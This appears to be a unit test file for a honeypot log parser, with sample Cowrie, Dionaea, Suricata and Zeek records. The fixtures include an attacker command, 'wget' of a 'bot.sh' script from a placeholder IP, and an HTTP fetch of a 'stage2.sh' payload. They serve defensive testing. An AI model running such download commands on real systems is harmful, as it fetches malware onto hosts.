from __future__ import annotations

import unittest

from honeypot_ai.parsers import parse_record


class ParserTests(unittest.TestCase):
    def test_cowrie_record(self) -> None:
        event = parse_record(
            {
                "timestamp": "2026-05-09T08:00:15Z",
                "eventid": "cowrie.command.input",
                "src_ip": "198.51.100.23",
                "session": "s1",
                "input": "wget http://203.0.113.50/bot.sh",
            }
        )

        self.assertEqual(event.source, "cowrie")
        self.assertEqual(event.event_type, "cowrie.command.input")
        self.assertEqual(event.session, "s1")
        self.assertIn("wget", event.command or "")

    def test_dionaea_incident_record(self) -> None:
        event = parse_record(
            {
                "timestamp": "2026-05-09T08:05:00Z",
                "origin": "dionaea.connection.tcp.accept",
                "data": {
                    "connection": {
                        "local_ip": "10.0.5.20",
                        "local_port": 445,
                        "remote_ip": "203.0.113.70",
                        "remote_port": 52944,
                        "protocol": "smbd",
                        "transport": "tcp",
                    }
                },
            }
        )

        self.assertEqual(event.source, "dionaea")
        self.assertEqual(event.src_ip, "203.0.113.70")
        self.assertEqual(event.dest_port, 445)

    def test_suricata_alert_record(self) -> None:
        event = parse_record(
            {
                "timestamp": "2026-05-09T08:07:00.000000+0000",
                "event_type": "alert",
                "src_ip": "203.0.113.70",
                "src_port": 52944,
                "dest_ip": "10.0.5.20",
                "dest_port": 445,
                "proto": "TCP",
                "alert": {"category": "Malware Command and Control Activity Detected"},
            }
        )

        self.assertEqual(event.source, "suricata")
        self.assertEqual(event.event_type, "alert")
        self.assertEqual(event.protocol, "TCP")

    def test_zeek_conn_record(self) -> None:
        event = parse_record(
            {
                "ts": 1778314140.305988,
                "uid": "C5bLoe2Mvxqhawzqqd",
                "id.orig_h": "10.0.5.20",
                "id.orig_p": 46378,
                "id.resp_h": "203.0.113.70",
                "id.resp_p": 80,
                "proto": "tcp",
            }
        )

        self.assertEqual(event.source, "zeek")
        self.assertEqual(event.session, "C5bLoe2Mvxqhawzqqd")
        self.assertEqual(event.dest_ip, "203.0.113.70")

    def test_zeek_http_record(self) -> None:
        event = parse_record(
            {
                "ts": 1778314160.0,
                "uid": "CHttp1",
                "id.orig_h": "10.0.5.20",
                "id.orig_p": 46380,
                "id.resp_h": "203.0.113.70",
                "id.resp_p": 80,
                "method": "GET",
                "host": "payload.example",
                "uri": "/stage2.sh",
            }
        )

        self.assertEqual(event.source, "zeek")
        self.assertEqual(event.event_type, "zeek.http")
        self.assertEqual(event.domain, "payload.example")
        self.assertEqual(event.url, "http://payload.example/stage2.sh")

    def test_zeek_dns_record(self) -> None:
        event = parse_record(
            {
                "ts": 1778314170.0,
                "uid": "CDns1",
                "id.orig_h": "10.0.5.20",
                "id.orig_p": 54321,
                "id.resp_h": "10.0.5.1",
                "id.resp_p": 53,
                "proto": "udp",
                "query": "payload.example",
                "qtype_name": "A",
            }
        )

        self.assertEqual(event.source, "zeek")
        self.assertEqual(event.event_type, "zeek.dns")
        self.assertEqual(event.domain, "payload.example")


if __name__ == "__main__":
    unittest.main()
